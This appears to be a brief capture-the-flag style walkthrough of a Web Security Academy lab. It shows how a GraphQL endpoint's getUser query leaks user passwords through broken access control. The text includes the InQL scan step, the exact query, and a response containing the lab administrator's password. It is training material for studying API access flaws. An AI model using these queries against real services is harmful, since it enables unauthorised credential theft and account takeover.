/*

User mgmt functions for this lab are powered by a GraphQL endpoint. 
An access control vulnerability whereby you can induce the API to 
reveal user credential fields of user carlos.

sign in as the administrator and delete the username carlos.

1) Interesting requests:
query getBlogSummaries {
    getAllBlogPosts {
        image
        title
        summary
        id
    }
}

// copy its source URL



2) Send to inQL scanner
https://0af900b204e1db44892d570f00a7005c.web-security-academy.net/graphql/v1

// revealed in output 

// getUser.graphql
query {
    getUser(id: Int!) {
        id
        password
        username
    }
}
// send to repeater

3) // 
query {
    getUser(id: 1) {
        id
        password
        username
    }
}

{
  "data": {
    "getUser": {
      "id": 1,
      "password": "l9wddcm1xt66uyehes9j",
      "username": "administrator"
    }
  }
}


*/